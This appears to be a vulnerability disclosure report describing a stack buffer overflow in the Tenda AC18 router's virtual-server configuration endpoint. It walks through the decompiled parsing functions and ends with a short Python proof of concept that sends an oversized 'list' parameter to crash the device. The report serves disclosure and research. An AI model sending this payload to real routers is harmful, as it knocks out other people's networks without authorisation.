# Bug Report: Buffer Overflow in Tenda AC18 16.03.34.06 Router

### summary

A stack-based buffer overflow vulnerability in the Tenda AC18 router (firmware V16.03.34.06) allows remote attackers to execute arbitrary code or cause denial of service (DoS) via the `list` parameter in the `/goform/SetVirtualServerCfg` endpoint. The flaw resides in the `sub_75F48` function (invoked by `formSetVirtualSer`), which processes the `list` input with unsafe `sscanf` and `sprintf` formatting operations lacking bounds checking, enabling stack memory corruption

### Vulnerability Details

**Product Information**

Product: Tenda AC18 Wireless Router

Affected Version: V16.03.34.06

Vulnerability Type: Stack-based Buffer Overflow

### Description:

The vulnerability exists in the processing chain of the `list` parameter in the `formSetVirtualSer` function and its dependent `sub_75F48` function. The call chain and key operations are as follows:

- **Parameter Retrieval:** The `list` parameter is retrieved via `sub_2B884` (acting as a parameter fetching function) in `formSetVirtualSer` and directly passed to `sub_75F48` for virtual server rule processing, with no initial input validation.
- **Rule Parsing:** `sub_75F48` checks if the length of `list` is strictly greater than 4 bytes, then splits the input by a delimiter (controlled by the third parameter `a3`, value `0x7E` or `~`) using `strchr`. Each split segment is treated as a virtual server rule entry.
- **Data Extraction:** For each rule entry, `sscanf` is used to parse four fields (via format string `"%[^,]%*c%[^,]%*c%[^,]%*c%s"`), extracting values into small stack buffers `v12`, `v11`, `v10`, and `v9`.
- **Unsafe Formatting:** Critical unsafe operations occur in `sub_75F48` when constructing the configuration string:
  - `sprintf(v13, "0;%s;%s;%s;%s;1", (const char *)v10, (const char *)v11, (const char *)v12, (const char *)v9)`: This formats the parsed fields into `v13`, a fixed-size 256-byte stack buffer.
  - No bounds checking is performed on the length of the parsed fields (`v9` to `v12`), which are directly derived from the user-controlled `list` parameter.
  - If any of the parsed fields are sufficiently long, the `sprintf` call will overflow the 256-byte `v13` buffer, overwriting adjacent stack memory (including return addresses, saved registers, and other critical stack data). This allows an attacker to corrupt the stack and potentially execute arbitrary code.

![image-20260413201114256](D:\Data\IoT_vlu\reports\Tenda\formSetVirtualSer\image0.png)

![image-20260413201216284](D:\Data\IoT_vlu\reports\Tenda\formSetVirtualSer\image1.png)

### POC

```python
import requests

cyclic = 0x100 * b'A'
host = "192.168.0.1:80"

def exploit_formSetVirtualSer():
    url = f"http://{host}/goform/SetVirtualServerCfg"
    payload = cyclic + b",a,b,WAN1"
    data = {
        b"list":payload
    }
    res = requests.post(url=url,data=data)
    print(res.content)


exploit_formSetVirtualSer()
```

![image-20260413201458890](D:\Data\IoT_vlu\reports\Tenda\formSetVirtualSer\image2.png)

![image-20260413201624821](D:\Data\IoT_vlu\reports\Tenda\formSetVirtualSer\image3.png)

This script sends a crafted `list` parameter containing overly long padding data along with required delimiters. When processed by the `sub_75F48` function, the subsequent `sprintf` call will overflow the 256-byte `v13` stack buffer, causing severe stack memory corruption. Successful exploitation may result in  a denial of service (DoS) condition, leading to a router crash or reboot.